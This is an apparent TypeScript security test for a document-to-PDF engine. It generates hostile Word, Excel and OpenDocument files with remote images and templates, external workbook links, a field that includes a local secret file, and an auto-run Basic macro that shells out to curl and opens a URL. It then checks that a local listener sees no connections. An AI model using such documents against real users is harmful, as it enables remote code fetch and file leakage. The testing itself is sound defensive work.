/**
 * Phase 31 §7.6 / §18 test 15 — the engine, handed documents that try to
 * reach out, reaches nothing.
 *
 *   npx tsx tools/rendition-engine/hostile.ts <engine-dir>
 *
 * Runs the built engine through the app's own host (the same process,
 * permission model and child entry the app uses) and converts documents that
 * link remote images, a remote template, remote and local fields, an
 * external workbook, and a document macro set to run on load — all pointing
 * at a listener on 127.0.0.1 that counts every connection. It must count
 * zero; the conversions must end (a PDF or a refusal, never a hang); and
 * nothing read from outside the engine may appear in a PDF.
 *
 * CI runs it on Node 24 (Electron 44's runtime, which cannot deny the network
 * itself — the case the network-free build exists for) and on Node 26.
 */
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { EngineHost, EngineUnavailable, runtimeIsolation } from '../../src/backend/services/rendition/engine-host';

const engineDir = path.resolve(process.argv[2] ?? '');
const childScript = path.resolve('out/rendition/engine-child.cjs');
if (!fs.existsSync(path.join(engineDir, 'engine.json'))) { console.error('usage: hostile.ts <engine-dir>'); process.exit(2); }
if (!fs.existsSync(childScript)) { console.error('run `npm run build:rendition` first'); process.exit(2); }

function zip(parts: Record<string, string>): Buffer {
  const locals: Buffer[] = []; const centrals: Buffer[] = []; let offset = 0;
  for (const [name, text] of Object.entries(parts)) {
    const raw = Buffer.from(text); const data = zlib.deflateRawSync(raw); const n = Buffer.from(name);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(8, 8);
    local.writeUInt32LE(zlib.crc32(raw), 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(raw.length, 22); local.writeUInt16LE(n.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(8, 10);
    central.writeUInt32LE(zlib.crc32(raw), 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(n.length, 28); central.writeUInt32LE(offset, 42);
    locals.push(local, n, data); centrals.push(central, n); offset += 30 + n.length + data.length;
  }
  const cd = Buffer.concat(centrals); const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(centrals.length / 2, 8); end.writeUInt16LE(centrals.length / 2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, end]);
}

const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';

function docx(base: string, secretPath: string): Buffer {
  const field = (instr: string) => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> ${instr} </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>cached</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
  const linkedPicture = '<w:p><w:r><w:drawing><wp:inline><wp:extent cx="95250" cy="95250"/><wp:docPr id="1" name="remote"/><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr id="1" name="remote.png"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill><a:blip r:link="rIdRemote"/></pic:blipFill><pic:spPr/></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>';
  return zip({
    '[Content_Types].xml': '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>',
    '_rels/.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/></Relationships>`,
    'word/_rels/document.xml.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdRemote" Type="${REL}/image" Target="${base}/image.png" TargetMode="External"/><Relationship Id="rIdSettings" Type="${REL}/settings" Target="settings.xml"/></Relationships>`,
    'word/settings.xml': `<w:settings ${W}><w:attachedTemplate r:id="rIdTemplate"/><w:linkStyles/></w:settings>`,
    'word/_rels/settings.xml.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdTemplate" Type="${REL}/attachedTemplate" Target="${base}/template.dotx" TargetMode="External"/></Relationships>`,
    'word/document.xml': `<w:document ${W}><w:body><w:p><w:r><w:t>Hostile document</w:t></w:r></w:p>${linkedPicture}${field(`INCLUDEPICTURE "${base}/field.png" \\d`)}${field(`INCLUDETEXT "${base}/field.txt"`)}${field(`INCLUDETEXT "${secretPath}"`)}</w:body></w:document>`,
  });
}

function xlsx(base: string): Buffer {
  return zip({
    '[Content_Types].xml': '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/></Types>',
    '_rels/.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>`,
    'xl/workbook.xml': `<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="${REL}"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets><externalReferences><externalReference r:id="rId2"/></externalReferences></workbook>`,
    'xl/_rels/workbook.xml.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="${REL}/externalLink" Target="externalLinks/externalLink1.xml"/></Relationships>`,
    'xl/externalLinks/externalLink1.xml': `<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="${REL}"><externalBook r:id="rId1"><sheetNames><sheetName val="Remote"/></sheetNames><sheetDataSet><sheetData sheetId="0"><row r="1"><cell r="A1"><v>42</v></cell></row></sheetData></sheetDataSet></externalBook></externalLink>`,
    'xl/externalLinks/_rels/externalLink1.xml.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/externalLinkPath" Target="${base}/book.xlsx" TargetMode="External"/></Relationships>`,
    'xl/worksheets/sheet1.xml': '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><f>[1]Remote!A1</f><v>42</v></c></row></sheetData></worksheet>',
  });
}

/** An OpenDocument text whose Basic macro, bound to "document loaded", would open a URL and a shell. */
function odtWithMacro(base: string): Buffer {
  return zip({
    'mimetype': 'application/vnd.oasis.opendocument.text',
    'META-INF/manifest.xml': '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/></manifest:manifest>',
    'content.xml': `<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document"/></office:event-listeners></office:scripts><office:body><office:text><text:p>Macro document</text:p></office:text></office:body></office:document-content>`,
    'Basic/script-lc.xml': '<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd"><library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink"><library:library library:name="Standard" library:link="false"/></library:libraries>',
    'Basic/Standard/script-lb.xml': '<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd"><library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false"><library:element library:name="Module1"/></library:library>',
    'Basic/Standard/Module1.xml': `<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd"><script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub OnLoad\n  Shell("curl ${base}/shell")\n  CreateUnoService("com.sun.star.system.SystemShellExecute").execute("${base}/execute", "", 0)\nEnd Sub</script:module>`,
  });
}

async function pdfText(pdf: Uint8Array): Promise<string> {
  const pdfjs = await import('pdfjs-dist/legacy/build/pdf.mjs');
  const doc = await pdfjs.getDocument({ data: pdf.slice(), isEvalSupported: false } as never).promise;
  let text = '';
  for (let i = 1; i <= doc.numPages; i++) {
    const content = await (await doc.getPage(i)).getTextContent();
    text += content.items.map((it) => ('str' in it ? it.str : '')).join(' ');
  }
  return text;
}

async function main(): Promise<void> {
  const connections: string[] = [];
  const server = net.createServer((sock) => { connections.push(`${sock.remoteAddress}:${sock.remotePort}`); sock.destroy(); });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const port = (server.address() as net.AddressInfo).port;
  const base = `http://127.0.0.1:${port}`;

  const secretDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ct-hostile-'));
  const secret = `SECRET-${Math.random().toString(36).slice(2)}`;
  const secretPath = path.join(secretDir, 'secret.txt');
  fs.writeFileSync(secretPath, secret);

  const isolation = runtimeIsolation();
  const host = new EngineHost({ engineDir, childScript, timeoutMs: 60_000, startTimeoutMs: 180_000 });
  console.log(`Node ${process.version}; runtime can deny the network: ${isolation.net}`);

  const cases: Array<[string, Buffer, string]> = [
    ['remote image, template and fields', docx(base, secretPath), 'docx'],
    ['external workbook link', xlsx(base), 'xlsx'],
    ['Basic macro on load', odtWithMacro(base), 'odt'],
  ];
  const failures: string[] = [];
  for (const [what, bytes, ext] of cases) {
    const t = Date.now();
    try {
      const pdf = await host.convert(bytes, ext);
      const text = await pdfText(pdf);
      if (text.includes(secret)) failures.push(`${what}: the PDF contains a file from outside the engine`);
      console.log(`  ${what}: PDF, ${pdf.byteLength} bytes, ${Date.now() - t}ms`);
    } catch (err) {
      // Refusing a document is acceptable. An engine that cannot run proves
      // nothing, and hanging past the timeout is not acceptable either.
      const message = (err as Error).message;
      if (err instanceof EngineUnavailable || /took longer/.test(message)) failures.push(`${what}: ${message}`);
      console.log(`  ${what}: refused (${message}), ${Date.now() - t}ms`);
    }
  }
  // Anything slow to connect gets a moment.
  await new Promise((r) => setTimeout(r, 2000));
  host.stop();
  server.close();
  fs.rmSync(secretDir, { recursive: true, force: true });

  if (connections.length) failures.push(`the listener saw ${connections.length} connection(s): ${connections.join(', ')}`);
  console.log(failures.length ? `FAILED\n  ${failures.join('\n  ')}` : 'network-free: zero connections, nothing from outside the engine in any PDF');
  process.exit(failures.length ? 1 : 0);
}

main().catch((err) => { console.error(err); process.exit(1); });
